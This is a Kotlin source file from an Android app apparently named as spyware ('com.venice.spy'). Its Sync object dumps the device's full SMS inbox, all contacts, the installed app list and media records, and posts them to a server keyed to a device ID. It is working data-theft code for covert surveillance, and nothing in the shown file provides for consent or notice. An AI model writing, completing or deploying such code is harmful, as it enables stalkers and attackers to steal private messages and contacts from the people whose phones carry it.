package com.venice.spy

import android.annotation.SuppressLint
import android.content.Context
import android.net.Uri
import android.provider.ContactsContract
import android.provider.Telephony
import org.json.JSONArray
import org.json.JSONObject
import java.security.MessageDigest
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.TimeZone

object Sync {

    fun md5(s: String): String =
        MessageDigest.getInstance("MD5").digest(s.toByteArray())
            .joinToString("") { "%02x".format(it) }

    fun iso(ms: Long): String {
        val f = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US)
        f.timeZone = TimeZone.getTimeZone("UTC")
        return f.format(Date(ms))
    }

    /** পুরো SMS ইনবক্স ডাম্প করে (ইনক্রিমেন্টাল) */
    @SuppressLint("Range")
    fun syncSms(ctx: Context, prefs: Prefs, full: Boolean = false) {
        val since = if (full) 0L else prefs.lastSmsTs
        var newest = since
        val arr = JSONArray()
        val cols = arrayOf("address", "body", "date", "type")
        val cur = ctx.contentResolver.query(
            Telephony.Sms.CONTENT_URI, cols, "date > ?",
            arrayOf(since.toString()), "date ASC LIMIT 500") ?: return

        cur.use { c ->
            while (c.moveToNext()) {
                val addr = c.getString(0) ?: "Unknown"
                val body = c.getString(1) ?: ""
                val date = c.getLong(2)
                val type = c.getInt(3)
                if (date > newest) newest = date
                arr.put(JSONObject().apply {
                    put("key", md5("${prefs.deviceId}|$addr|$date|$body"))
                    put("device_id", prefs.deviceId)
                    put("address", addr)
                    put("body", body)
                    put("direction", if (type == 2) "out" else "in")
                    put("ts", iso(date))
                })
            }
        }
        if (arr.length() > 0) Api.post("sms", arr.toString(), "key")
        prefs.lastSmsTs = newest
    }

    @SuppressLint("Range")
    fun syncContacts(ctx: Context, prefs: Prefs) {
        val arr = JSONArray()
        val cur = ctx.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
            ), null, null, null) ?: return
        cur.use { c ->
            while (c.moveToNext()) {
                val name = c.getString(0) ?: ""
                val phone = c.getString(1) ?: ""
                arr.put(JSONObject().apply {
                    put("key", md5("${prefs.deviceId}|$phone"))
                    put("device_id", prefs.deviceId)
                    put("name", name)
                    put("phone", phone)
                })
            }
        }
        if (arr.length() > 0) Api.post("contacts", arr.toString(), "key")
    }

    fun syncApps(ctx: Context, prefs: Prefs) {
        val arr = JSONArray()
        val pm = ctx.packageManager
        for (p in pm.getInstalledApplications(0)) {
            arr.put(JSONObject().apply {
                put("key", md5("${prefs.deviceId}|${p.packageName}"))
                put("device_id", prefs.deviceId)
                put("label", pm.getApplicationLabel(p).toString())
                put("package", p.packageName)
                put("version", try { pm.getPackageInfo(p.packageName, 0).versionName ?: "" } catch (e: Exception) { "" })
                put("system", (p.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0)
            })
        }
        if (arr.length() > 0) Api.post("apps", arr.toString(), "key")
    }

    fun mediaRow(ctx: Context, prefs: Prefs, kind: String, url: String, size: Long) {
        Api.post("media", JSONArray().put(JSONObject().apply {
            put("device_id", prefs.deviceId)
            put("kind", kind)
            put("url", url)
            put("size", size)
        }).toString())
    }
}